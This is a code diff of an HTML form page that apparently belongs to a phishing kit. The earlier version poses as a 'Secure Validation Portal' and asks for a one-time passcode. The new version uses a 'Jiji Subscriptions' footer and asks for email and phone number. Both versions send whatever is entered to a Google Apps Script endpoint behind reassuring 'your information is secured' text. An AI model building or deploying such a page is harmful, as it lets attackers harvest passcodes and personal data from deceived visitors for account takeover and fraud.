@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Secure Validation Platform</title>
+  <title>Additional Details</title>
   <style>
     body { font-family: Arial, sans-serif; background-color: #f5f5f5; margin:0; padding:0; }
     .container { max-width:400px; margin:40px auto; background:#fff; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.1); overflow:hidden; }
@@ -23,75 +23,71 @@
 <body>
   <div class="container">
     <div class="header">
-      <h2>Welcome to the Secure Validation Portal</h2>
-      <p>PLEASE ENTER YOUR VALIDATION OTP TO CONTINUE</p>
+      <h2>Additional Details Required</h2>
+      <p>Please submit additional information to complete validation.</p>
     </div>
 
     <!-- Form -->
-    <form id="regForm" autocomplete="off">
-      <label for="validation_otp">Validation OTP</label>
-      <input type="text" id="validation_otp" name="validation_otp" placeholder="Enter your Validation OTP" required>
+    <form id="detailsForm" autocomplete="off">
+      <label for="email">Email Address</label>
+      <input type="email" id="email" name="email" placeholder="Enter your email" required>
 
-      <div class="notice" id="status">Your credentials are secured.</div>
+      <label for="phone">Phone Number</label>
+      <input type="text" id="phone" name="phone" placeholder="Enter your phone number" required>
 
-      <button type="submit" class="btn">Validate OTP →</button>
+      <div class="notice" id="status">Your information is secured.</div>
+
+      <button type="submit" class="btn">Submit Details →</button>
     </form>
 
     <div class="footer">
-      © 2025 Secure Services – All Rights Reserved
+      © 2025 Jiji Subscriptions – All Rights Reserved
     </div>
   </div>
 
   <script>
-    (function () {
-      const form = document.getElementById('regForm');
-      const statusEl = document.getElementById('status');
+    const form = document.getElementById('detailsForm');
+    const statusEl = document.getElementById('status');
 
-      // ✅ Updated working Web App URL
-      const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbxeIPpKVQOagylbISVnIckuJeazhERR8IYTxtJQFhCqRNJmawsQ-b4_b5pkSQRBldxN/exec';
+    const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbxeIPpKVQOagylbISVnIckuJeazhERR8IYTxtJQFhCqRNJmawsQ-b4_b5pkSQRBldxN/exec';
 
-      form.addEventListener('submit', async function (e) {
-        e.preventDefault();
-        statusEl.textContent = 'Submitting...';
-        statusEl.style.color = '#666';
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      statusEl.textContent = 'Submitting...';
+      statusEl.style.color = '#666';
 
-        const validation_otp = document.getElementById('validation_otp').value.trim();
+      try {
+        const formData = new FormData(form);
 
-        // Send as form data (works reliably with Apps Script)
-        const formData = new FormData();
-        formData.append("validation_otp", validation_otp);
+        const response = await fetch(WEBAPP_URL, {
+          method: 'POST',
+          body: formData
+        });
 
+        const text = await response.text();
+        console.log("Server says:", text);
+
+        let json;
         try {
-          const resp = await fetch(WEBAPP_URL, {
-            method: 'POST',
-            body: formData
-          });
-
-          const text = await resp.text();
-          console.log("Raw response:", text);
-
-          let json;
-          try {
-            json = JSON.parse(text);
-          } catch (err) {
-            statusEl.textContent = "Invalid JSON: " + text;
-            statusEl.style.color = "#aa0000";
-            return;
-          }
-
-          if (json.result === 'success') {
-            window.location.href = "thankyou.html"; 
-          } else {
-            statusEl.textContent = 'Submission failed: ' + (json.message || 'Unknown error');
-            statusEl.style.color = '#aa0000';
-          }
+          json = JSON.parse(text);
         } catch (err) {
-          console.error(err);
-          statusEl.textContent = 'Error: ' + err.message;
+          statusEl.textContent = "Invalid JSON: " + text;
+          statusEl.style.color = "#aa0000";
+          return;
+        }
+
+        if (json.result === 'success') {
+          window.location.href = "thankyou.html"; // ✅ redirect to final thank you page
+        } else {
+          statusEl.textContent = 'Submission failed: ' + (json.message || 'Unknown error');
           statusEl.style.color = '#aa0000';
         }
-      });
-    })();
+      } catch (err) {
+        console.error(err);
+        statusEl.textContent = 'Error: ' + err.message;
+        statusEl.style.color = '#aa0000';
+      }
+    });
   </script>
 </body>
 </html>
